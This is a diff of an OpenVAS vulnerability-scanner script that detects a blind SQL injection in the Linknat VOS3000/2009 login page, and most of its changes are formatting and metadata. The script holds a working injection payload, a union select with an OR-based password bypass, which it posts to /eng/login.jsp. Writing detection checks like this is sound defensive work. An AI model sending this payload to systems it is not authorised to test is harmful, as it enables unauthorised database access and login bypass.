@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_linknat_vos_sql_inj.nasl 5612 2017-03-20 10:00:41Z teissa $
+# $Id: gb_linknat_vos_sql_inj.nasl 11449 2018-09-18 10:04:42Z mmartin $
 #
 # Linknat VOS3000/2009 SQL Injection Vulnerability
 #
@@ -27,18 +27,18 @@
 
 CPE = 'cpe:/a:linknat:vos';
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.106085");
-  script_version("$Revision: 5612 $");
-  script_tag(name: "last_modification", value: "$Date: 2017-03-20 11:00:41 +0100 (Mon, 20 Mar 2017) $");
-  script_tag(name: "creation_date", value: "2016-05-25 12:52:24 +0700 (Wed, 25 May 2016)");
-  script_tag(name: "cvss_base", value: "9.4");
-  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:N");
+  script_version("$Revision: 11449 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2016-05-25 12:52:24 +0700 (Wed, 25 May 2016)");
+  script_tag(name:"cvss_base", value:"9.4");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:N");
 
-  script_tag(name: "qod_type", value: "remote_active");
+  script_tag(name:"qod_type", value:"remote_active");
 
-  script_tag(name: "solution_type", value: "VendorFix");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   script_name("Linknat VOS3000/2009 SQL Injection Vulnerability");
 
@@ -49,21 +49,21 @@ if (description)
   script_dependencies("gb_linknat_vos_detect_http.nasl");
   script_mandatory_keys("linknat_vos/detected");
 
-  script_tag(name: "summary", value: "Linknat VOS3000/2009 is prone to an SQL Injection vulnerability");
+  script_tag(name:"summary", value:"Linknat VOS3000/2009 is prone to an SQL Injection vulnerability");
 
-  script_tag(name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response.");
+  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");
 
-  script_tag(name: "insight", value: "A time-based blind SQL-Injection has been found in the login page.
-Results can be gathered from the output of welcome.jsp during the same session.");
+  script_tag(name:"insight", value:"A time-based blind SQL-Injection has been found in the login page.
+  Results can be gathered from the output of welcome.jsp during the same session.");
 
-  script_tag(name: "impact", value: "A remote attacker can gain access to the underlying database and
-manipulate it with DBA privileges.");
+  script_tag(name:"impact", value:"A remote attacker can gain access to the underlying database and
+  manipulate it with DBA privileges.");
 
-  script_tag(name: "affected", value: "Version 2.1.1.5, 2.1.1.8 and 2.1.2.0");
+  script_tag(name:"affected", value:"Version 2.1.1.5, 2.1.1.8 and 2.1.2.0");
 
-  script_tag(name: "solution", value: "Upgrade to version 2.1.2.4 or later");
+  script_tag(name:"solution", value:"Upgrade to version 2.1.2.4 or later");
 
-  script_xref(name: "URL", value: "http://seclists.org/fulldisclosure/2016/May/57");
+  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/May/57");
 
   exit(0);
 }
@@ -71,6 +71,7 @@ manipulate it with DBA privileges.");
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_app_port(cpe: CPE, service: 'www');
 if( !port)
@@ -78,7 +79,7 @@ if( !port)
 
 host = http_host_name(port: port);
 
-data = "loginType=1&name='+union+select+1,2,3,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,5,6#&pass='+OR+''='";
+data = "loginType=1&name='+union+select+1,2,3,0x53514c2d496e6a656374696f6e2d54657374,5,6#&pass='+OR+''='";
 
 req = http_post_req(port: port, url: "/eng/login.jsp", data: data,
                     add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
@@ -90,7 +91,7 @@ if (!cookie)
 
 cookie = cookie[1];
 
-if (http_vuln_check(port: port, url: '/eng/welcome.jsp', pattern: 'OpenVAS-SQL-Injection-Test',
+if (http_vuln_check(port: port, url: '/eng/welcome.jsp', pattern: 'SQL-Injection-Test',
                     cookie: cookie)) {
   security_message(port: port);
   exit(0);
